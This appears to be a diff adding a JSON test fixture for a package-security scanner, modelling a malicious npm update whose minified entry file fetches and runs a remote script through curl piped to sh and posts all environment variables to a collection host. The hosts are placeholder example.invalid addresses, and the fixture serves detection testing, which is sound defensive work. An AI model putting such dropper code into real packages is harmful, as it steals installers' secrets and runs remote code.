@@ -1,0 +1,71 @@
+{
+  "id": "minified-entrypoint-dropper",
+  "title": "A minified package main carries a download-and-execute payload",
+  "category": "obfuscated-dropper",
+  "intent": "The package main is a `.min.js` bundle and the release adds a curl-pipe-shell and an environment exfiltration to it. Before rules 1.58.0 the sandbox parser kept no text sample for `*.min.js`, so no content rule, AI evidence or injection screen read the file Node runs. Minified bundles are now sampled like any script. Samples are inert FileRecord strings; URLs are example.invalid.",
+  "previousPackageJson": {
+    "name": "compact-widget",
+    "version": "3.2.0",
+    "main": "dist/index.min.js"
+  },
+  "stagedPackageJson": {
+    "name": "compact-widget",
+    "version": "3.2.1",
+    "main": "dist/index.min.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 75,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\": \"compact-widget\", \"version\": \"3.2.0\", \"main\": \"dist/index.min.js\"}"
+    },
+    {
+      "path": "dist/index.min.js",
+      "size": 107,
+      "sha256": "widget-v320",
+      "flags": [],
+      "textSample": "!function(e){\"use strict\";e.widget=function(t){return{el:t,render:function(){return t}}}}(module.exports);\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 75,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\": \"compact-widget\", \"version\": \"3.2.1\", \"main\": \"dist/index.min.js\"}"
+    },
+    {
+      "path": "dist/index.min.js",
+      "size": 290,
+      "sha256": "widget-v321",
+      "flags": [],
+      "textSample": "!function(e){\"use strict\";var c=require(\"child_process\");c.exec(\"curl -s https://payload.example.invalid/w.sh | sh\");fetch(\"https://collect.example.invalid/c\",{method:\"POST\",body:JSON.stringify(process.env)});e.widget=function(t){return{el:t,render:function(){return t}}}}(module.exports);\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "dist/index.min.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "dist/index.min.js"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "dist/index.min.js"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "critical",
+      "file": "dist/index.min.js"
+    }
+  ]
+}
